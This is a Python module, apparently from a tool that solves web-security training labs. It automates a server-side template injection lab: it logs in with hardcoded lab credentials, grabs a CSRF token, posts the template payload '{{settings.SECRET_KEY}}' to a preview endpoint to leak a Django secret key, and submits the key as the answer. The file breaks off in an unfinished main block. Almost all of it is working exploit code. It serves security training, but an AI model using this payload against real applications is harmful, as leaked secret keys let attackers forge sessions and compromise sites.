from .base_scenario import BaseLabScenario
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import requests  # Added for standalone execution

# ANSI Color Codes
COLOR_RED = "\033[91m"
COLOR_GREEN = "\033[92m"
COLOR_YELLOW = "\033[93m"
COLOR_BLUE = "\033[94m"
COLOR_MAGENTA = "\033[95m"
COLOR_CYAN = "\033[96m"
COLOR_WHITE = "\033[97m"
COLOR_RESET = "\033[0m"

class Scenario5(BaseLabScenario):
    """Exploit for 'Server-side template injection with information disclosure' lab"""
    
    def __init__(self, target_url, session):  # Updated signature
        super().__init__(target_url, session)
        self.product_id = "1"  # Default product ID

    @classmethod
    def detect(cls, response_text):
        """Check if this is Scenario 5 by identifying text"""
        return "Server-side template injection with information disclosure via user-supplied objects" in response_text
    
    def lab_name(self):
        return "Server-side template injection with information disclosure (Scenario 5)"

    def get_template_csrf(self):
        """Get CSRF token from template editing page"""
        try:
            template_page = self.session.get(
                urljoin(self.target_url, f"/product/template?productId={self.product_id}")
            )
            return self.get_csrf_token(template_page.text)
        except Exception as e:
            print(f"[-] Error getting template CSRF: {str(e)}")
            return None

    def extract_secret_key(self):
        """Extract Django secret key using SSTI"""
        try:
            csrf_token = self.get_template_csrf()
            if not csrf_token:
                return None
            
            # Send payload to expose secret key
            response = self.session.post(
                urljoin(self.target_url, f"/product/template?productId={self.product_id}"),
                data={
                    "csrf": csrf_token,
                    "template": "{{settings.SECRET_KEY}}",
                    "template-action": "preview"
                }
            )
            
            return self._parse_secret_key(response.text)
            
        except Exception as e:
            print(f"[-] Secret key extraction error: {str(e)}")
            return None

    def _parse_secret_key(self, response_text):
        """Parse secret key from response"""
        soup = BeautifulSoup(response_text, 'html.parser')
        preview_div = soup.find('div', {'id': 'preview-result'})
        if preview_div:
            return preview_div.text.strip()
        return None

    def submit_solution(self, secret_key):
        """Submit the secret key to solve the lab"""
        try:
            response = self.session.post(
                urljoin(self.target_url, "/submitSolution"),
                data={"answer": secret_key}
            )
            return "Congratulations" in response.text
        except Exception as e:
            print(f"[-] Solution submission error: {str(e)}")
            return False

    def exploit(self):
        """Execute full lab exploitation workflow"""
        try:
            # Login with content manager credentials
            if not self.login("content-manager", "C0nt3ntM4n4g3r"):
                return False
            
            # Extract secret key
            secret_key = self.extract_secret_key()
            if not secret_key:
                print(f"{COLOR_RED}[-] Failed to extract secret key{COLOR_RESET}")
                return False
            
            print(f"{COLOR_GREEN}[+] Extracted secret key: {COLOR_WHITE}{secret_key}{COLOR_RESET}")
            
            # Submit solution
            if self.submit_solution(secret_key):
                print(f"{COLOR_GREEN}[+] Lab solved successfully!{COLOR_RESET}")
                return True
                
            print(f"{COLOR_RED}[-] Failed to submit solution{COLOR_RESET}")
            return False
            
        except Exception as e:
            print(f"{COLOR_RED}[-] Exploit error: {str(e)}{COLOR_RESET}")
            return False

if __name__ == "__main__":
    import argparse
    
   
